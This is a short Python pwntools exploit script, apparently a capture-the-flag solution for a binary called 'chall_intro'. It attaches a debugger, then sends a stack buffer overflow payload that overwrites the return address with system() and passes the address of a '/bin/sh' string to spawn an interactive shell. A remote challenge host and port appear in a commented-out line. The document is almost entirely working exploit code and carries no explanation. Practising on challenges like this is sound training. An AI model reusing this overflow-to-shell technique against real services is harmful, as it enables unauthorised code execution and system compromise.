from pwn import *

elf = ELF("./chall_intro")
context.binary = elf
# Context terminal alacritty
context.terminal = ["alacritty", "-e", "sh", "-c"]

# host, port = "103.127.138.252", "17010"
# conn = remote(host, port)

conn = elf.process()
gdb.attach(
    conn,
    gdbscript="""
    break vulnerableFunction
    continue
    info locals
    info registers
    x/40xw $sp
    """,
    # gdbscript="",
)

system_addr = elf.symbols["system"]  # Use ELF symbol table to get the system address
bin_sh_addr = 0x40206C  # The address of the string "/bin/sh"

# Craft shellcode
payload = b"A" * 64  # Overflow buffer (adjust size if necessary)
payload += p64(system_addr)  # Overwrite the return address with system's address
payload += b"B" * 8
# payload += p64(0x0)  # Null return address or other argument if needed
payload += p64(0x0)
# payload += p64(0x0)  # Null terminator for the string
payload += p64(bin_sh_addr)  # Address of "/bin/sh" string as the argument to system()

conn.sendline(payload)

conn.interactive()
